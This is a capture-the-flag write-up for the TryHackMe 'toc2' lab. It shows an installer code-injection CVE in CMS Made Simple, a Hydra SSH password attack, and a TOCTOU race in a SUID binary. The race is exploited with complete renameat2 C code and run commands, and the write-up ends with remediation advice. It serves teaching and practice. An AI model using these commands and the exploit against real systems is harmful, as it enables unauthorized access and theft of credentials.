# toc2 - TryHackMe Machine Writeup

A complete penetration test writeup of the **toc2** machine from TryHackMe, covering reconnaissance, web exploitation of a CMS installer, SSH access, and privilege escalation through a race condition in a SUID binary.

> **Disclaimer:** This writeup is for educational purposes only. All testing was done on the TryHackMe lab machine. Do not use these techniques against systems you do not own or have explicit permission to test.

---

## Table of Contents

- [Overview](#overview)
- [Tools Used](#tools-used)
- [Attack Chain](#attack-chain)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Web Exploitation](#phase-2-web-exploitation)
- [Phase 3: Lateral Movement](#phase-3-lateral-movement)
- [Phase 4: Privilege Escalation](#phase-4-privilege-escalation)
- [Findings](#findings)
- [Remediation](#remediation)
- [Lessons Learned](#lessons-learned)
- [Repository Contents](#repository-contents)
- [Author](#author)

---

## Overview

| Item | Details |
|------|---------|
| Machine | toc2 |
| Platform | TryHackMe |
| Difficulty | Medium |
| Target OS | Ubuntu 20.04.6 LTS |
| Services | SSH (22), HTTP (80, Apache 2.4.41) |
| Vulnerable component | CMS Made Simple 2.1.6 installer (CVE-2018-7448) |
| Flags | `user.txt`, `root.txt` (captured, not shown here) |

## Tools Used

- **Nmap**: port and service enumeration
- **Browser (Firefox)**: manual web enumeration
- **Burp Suite Professional**: intercepting and modifying HTTP requests
- **Exploit-DB**: researching CVE-2018-7448
- **Metasploit Framework**: module search
- **Hydra**: SSH password attack
- **gcc**: compiling the privilege escalation exploit

## Attack Chain

```
Recon (Nmap, robots.txt)
   -> Maintenance page leaks database credentials
   -> Exposed CMS installer (CVE-2018-7448)
   -> Command execution as www-data
   -> SSH brute force (weak password) -> user frank
   -> SUID binary 'readcreds' + TOCTOU race condition
   -> Root credentials recovered -> root shell
```

---

## Phase 1: Reconnaissance

Full port scan with service detection:

```bash
nmap -sC -sV -p- --min-rate 5000 -T4 <TARGET_IP>
```

Result: ports **22 (SSH)** and **80 (HTTP)** open. The HTTP title was `Site Maintenance`.

Checking `robots.txt` revealed a disallowed installer path and a developer note mentioning the database name:

```
User-agent: *
Disallow: /cmsms/cmsms-2.1.6-install.php

Note to self:
Tomorrow, finish setting up the CMS, and that database, cmsmsdb, so the site's ready by Wednesday.
```

The maintenance page itself contained plaintext database credentials left by the developer.

## Phase 2: Web Exploitation

Browsing `/cmsms/` showed an index with the installer and its README. The README confirmed the installer is meant only for initial setup, but it was never removed.

The installed version, **CMS Made Simple 2.1.6**, is affected by **CVE-2018-7448**: during the database setup step, the `timezone` parameter is not sanitized and allows PHP code injection into `config.php`.

Steps:

1. Walk through the installer until **Step 4 (Database)**.
2. Intercept the POST request with Burp Suite.
3. Fill in the leaked database credentials and modify the `timezone` parameter with an injection payload that adds a command-execution hook.
4. Forward the request and complete the installation.
5. Execute commands through the hook:

```
http://<TARGET_IP>/cmsms/config.php?cmd=id;uname
```

Output confirmed code execution as `www-data`. Reading `/etc/passwd` revealed a local user named `frank`.

```
[redacted payload - see Exploit-DB 44192]
```

## Phase 3: Lateral Movement

Since SSH was open, a dictionary attack was run against `frank`:

```bash
hydra -l frank -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
```

Hydra found a valid password within seconds, showing the account used a common password. SSH login as `frank` then gave an interactive shell and the **user flag**.

## Phase 4: Privilege Escalation

In `frank`'s home directory there is a `root_access` folder containing:

- `readcreds`: a binary owned by root with the **SUID bit set**
- `readcreds.c`: its source code
- `root_password_backup`: a file holding root credentials

The source code shows a **TOCTOU (Time-of-Check to Time-of-Use)** race condition:

```c
if (!access(argv[1], R_OK)) {
    sleep(1);
    file_data = open(argv[1], O_RDONLY);
}
```

`access()` checks the file, then `open()` opens the path later. Between the two calls, the path can be swapped for a different file.

The exploit uses `renameat2()` with `RENAME_EXCHANGE` in a loop to atomically swap two files, so that the readable check passes on one file and the open reads the protected backup:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
    while (1) {
        syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
    }
    return 0;
}
```

Steps:

```bash
touch saini
gcc -o rename rename.c
./rename saini root_password_backup &
./readcreds saini        # repeat until the race is won
```

Running `readcreds` while the swap loop was active returned the root credentials. Using `su root` with those credentials gave a **root shell** and the **root flag**. (`sudo` with the `frank` password was rejected, so `su` was used instead.)

---

## Findings

| ID | Finding | Severity |
|----|---------|----------|
| F1 | Developer note in `robots.txt` discloses installer path and database name | Low |
| F2 | Plaintext database credentials on maintenance page | High |
| F3 | CMS installer left accessible after setup (CVE-2018-7448) | Critical |
| F4 | Command execution as `www-data` via injected `config.php` | Critical |
| F5 | Weak SSH password for user `frank` | High |
| F6 | Root credentials stored in plaintext in a backup file | Critical |
| F7 | TOCTOU race condition in SUID binary `readcreds` | High |
| F8 | Weak root password | High |

## Remediation

- **F1:** Remove internal notes and paths from `robots.txt`.
- **F2:** Never place credentials in web pages. Rotate exposed passwords and use a secrets manager.
- **F3:** Delete installer files after setup and disable directory listing (`Options -Indexes`).
- **F4:** Upgrade CMS Made Simple to a supported version and validate all installer input.
- **F5:** Enforce strong passwords or key-based SSH auth. Add rate limiting such as `fail2ban`.
- **F6:** Never store plaintext credentials in backups or user-owned directories.
- **F7:** Avoid separate `access()` and `open()` checks on the same path. Open first and use `fstat()`. Remove the SUID bit if it is not needed.
- **F8:** Use long, random passwords and restrict root login.

## Lessons Learned

- Small misconfigurations combine into a full compromise. No single finding was enough alone.
- Leftover installers and maintenance pages are common and dangerous. Always check `robots.txt` and common admin paths.
- File checks and file actions must be atomic. Checking a path and then opening it leaves a race window.
- Reading source code for security bugs (like TOCTOU patterns) is a valuable skill.

## Repository Contents

```
toc2-writeup/
├── README.md                              # This file
├── toc2_Pentest_Report_Nishant_Saini.pdf  # Full report with screenshots
└── screenshots/                           # Evidence images (optional)
```
<img width="1920" height="1080" alt="Screenshot_2026-10-08_21_25_45" src="https://github.com/user-attachments/assets/6989cf00-b9bd-4100-992b-ef55d32d8053" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_21_30_33" src="https://github.com/user-attachments/assets/ce4917bd-7516-4b64-bb6f-539db5789a49" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_21_32_55" src="https://github.com/user-attachments/assets/1ab51d9e-0fb3-4e26-ba61-876427dc3f63" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_21_33_00" src="https://github.com/user-attachments/assets/4d3e2996-8ece-439c-a3bd-6f2095a00936" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_21_39_01" src="https://github.com/user-attachments/assets/842c5255-ac14-4413-bf5a-48d21daecdac" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_21_39_07" src="https://github.com/user-attachments/assets/98aa304c-c629-41c6-ae96-92dab4450731" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_21_41_41" src="https://github.com/user-attachments/assets/9fda1c2c-0241-4080-8ff7-6fef5a0c91f6" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_21_43_16" src="https://github.com/user-attachments/assets/83f356b7-96aa-4ad6-a84e-99f85fa90ac5" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_21_45_07" src="https://github.com/user-attachments/assets/74e3bb25-9268-418b-be88-645a1484ab68" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_21_45_58" src="https://github.com/user-attachments/assets/6c9f28f3-5e44-4614-98a4-9c00c9164a58" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_00_38_44" src="https://github.com/user-attachments/assets/c16a688a-aa50-487e-b26f-2121275c9ae9" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_00_40_15" src="https://github.com/user-attachments/assets/4583e869-727a-4da8-b9e3-9726f7631b77" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_00_40_35" src="https://github.com/user-attachments/assets/9c782b16-ba87-4584-83c3-b9d0c45b8f40" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_00_40_42" src="https://github.com/user-attachments/assets/ea19988a-3bf5-41f3-a575-6f3001688f4c" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_00_40_56" src="https://github.com/user-attachments/assets/5bff9ee9-5246-4736-a66d-96749e0af7f1" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_00_43_33" src="https://github.com/user-attachments/assets/3011333a-ad6e-4a81-9145-96a372691a83" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_00_43_45" src="https://github.com/user-attachments/assets/2e55e1c4-a13d-4e19-997f-78e9b88e0121" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_00_44_55" src="https://github.com/user-attachments/assets/697b4892-c406-46df-83e4-3b889c3fc168" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_00_48_30" src="https://github.com/user-attachments/assets/ec011f9e-aff1-4a10-a93e-219d3948e2dd" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_00_48_43" src="https://github.com/user-attachments/assets/3b5c3f4d-8701-4ef8-a81f-01002ad3b463" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_17_34" src="https://github.com/user-attachments/assets/a9ec39e5-584a-45ea-a0ab-4f96296f2923" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_17_51" src="https://github.com/user-attachments/assets/2490b9a8-3fd4-45a9-b42b-624f48479783" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_21_51" src="https://github.com/user-attachments/assets/94f19fc7-d16e-4170-a022-9c07c6700d49" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_22_04" src="https://github.com/user-attachments/assets/7f296f9b-c358-455a-aff1-42093614fa37" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_22_48" src="https://github.com/user-attachments/assets/79eaf913-6572-40f9-a461-82caa1a5f560" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_24_24" src="https://github.com/user-attachments/assets/f338767a-65d0-4109-a9f3-edc2a16c0231" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_24_53" src="https://github.com/user-attachments/assets/e300a357-2378-4940-9d50-cc2e582c6154" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_24_58" src="https://github.com/user-attachments/assets/9e36e2a4-d0e5-42f8-a522-3cd20d166f96" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_25_56" src="https://github.com/user-attachments/assets/44fa7eef-bf10-411c-86dc-7c79cf79d511" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_28_20" src="https://github.com/user-attachments/assets/87d1dffb-6b3c-494f-871f-528f95ec3ccc" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_30_48" src="https://github.com/user-attachments/assets/5ee53cab-c7f0-40de-bfaf-103f875b8bb4" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_31_54" src="https://github.com/user-attachments/assets/a4c422da-7734-4954-8718-2e0b3fd4f5d2" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_32_12" src="https://github.com/user-attachments/assets/e58801bb-e616-46e8-b8f8-4dd6425e68b9" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_32_34" src="https://github.com/user-attachments/assets/e631e2c6-f2ae-4921-9cee-2f13c9f551f7" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_37_16" src="https://github.com/user-attachments/assets/91a60ad2-439e-4075-af85-90b9a627e617" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_49_15" src="https://github.com/user-attachments/assets/2ea5fe99-8f3b-4352-a83c-db4049516060" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_13_57_12" src="https://github.com/user-attachments/assets/ec488e06-3387-483c-bc80-226f35c7b60d" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_14_07_20" src="https://github.com/user-attachments/assets/a9727198-75d0-4ebe-adaa-e4221334459f" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_14_10_41" src="https://github.com/user-attachments/assets/de317844-5561-46e4-95a8-f78e4bc57346" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_14_15_06" src="https://github.com/user-attachments/assets/c4860937-db47-45b4-ac01-70a665508fbe" />


## Author

**Nishant Saini**
BCA Student | Full-stack and security enthusiast
GitHub: [@nishantsaini5786](https://github.com/nishantsaini5786)
